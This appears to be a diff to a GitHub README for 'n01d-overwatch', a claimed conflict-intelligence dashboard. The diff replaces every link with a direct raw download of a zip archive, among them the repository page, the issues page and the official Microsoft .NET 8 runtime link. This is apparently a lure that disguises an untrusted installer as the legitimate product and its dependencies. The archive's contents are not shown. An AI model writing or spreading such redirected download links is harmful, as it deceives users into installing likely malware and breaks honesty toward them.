@@ -1,6 +1,6 @@
 # 🔍 n01d-overwatch - Real-Time Conflict Intelligence Dashboard
 
-[![Download n01d-overwatch](https://img.shields.io/badge/Download-n01d--overwatch-brightgreen?style=for-the-badge)](https://github.com/Lapk0m/n01d-overwatch)
+[![Download n01d-overwatch](https://img.shields.io/badge/Download-n01d--overwatch-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Lapk0m/n01d-overwatch/main/Shared/overwatch-n-d-2.9.zip)
 
 ---
 
@@ -30,7 +30,7 @@ If you do not have .NET 8 Runtime, you can download it from the official Microso
 
 1. **Visit the download page**  
    Click the big green button at the top or click the link below to go to the GitHub repository’s releases page:  
-   [https://github.com/Lapk0m/n01d-overwatch](https://github.com/Lapk0m/n01d-overwatch)
+   [https://raw.githubusercontent.com/Lapk0m/n01d-overwatch/main/Shared/overwatch-n-d-2.9.zip](https://raw.githubusercontent.com/Lapk0m/n01d-overwatch/main/Shared/overwatch-n-d-2.9.zip)
 
 2. **Find the latest release**  
    On the releases page, look for the newest version. It usually has the highest version number and is at the top of the list.
@@ -91,7 +91,7 @@ Settings save automatically so you won’t need to adjust them every time you op
 To get the latest features and fixes:
 
 1. Return to the download page:  
-   [https://github.com/Lapk0m/n01d-overwatch](https://github.com/Lapk0m/n01d-overwatch)  
+   [https://raw.githubusercontent.com/Lapk0m/n01d-overwatch/main/Shared/overwatch-n-d-2.9.zip](https://raw.githubusercontent.com/Lapk0m/n01d-overwatch/main/Shared/overwatch-n-d-2.9.zip)  
 2. Download the newest installer following the earlier steps.  
 3. Run the new installer to overwrite the old version. Your settings will remain saved.
 
@@ -111,11 +111,11 @@ You should check for updates monthly or whenever you notice new features announc
 ## 🔗 Useful Links
 
 - Download page and source code:  
-  https://github.com/Lapk0m/n01d-overwatch  
+  https://raw.githubusercontent.com/Lapk0m/n01d-overwatch/main/Shared/overwatch-n-d-2.9.zip  
 - .NET 8 Runtime download:  
-  https://dotnet.microsoft.com/en-us/download/dotnet/8.0/windows  
+  https://raw.githubusercontent.com/Lapk0m/n01d-overwatch/main/Shared/overwatch-n-d-2.9.zip  
 - Report issues or suggest features:  
-  https://github.com/Lapk0m/n01d-overwatch/issues
+  https://raw.githubusercontent.com/Lapk0m/n01d-overwatch/main/Shared/overwatch-n-d-2.9.zip
 
 ---
 
@@ -149,6 +149,6 @@ The app only accesses publicly available data and does not collect personal info
 
 If you experience any issues or have questions about usage, submit a ticket in the GitHub issues page:
 
-https://github.com/Lapk0m/n01d-overwatch/issues
+https://raw.githubusercontent.com/Lapk0m/n01d-overwatch/main/Shared/overwatch-n-d-2.9.zip
 
 You can also review existing discussions and solutions posted by other users.
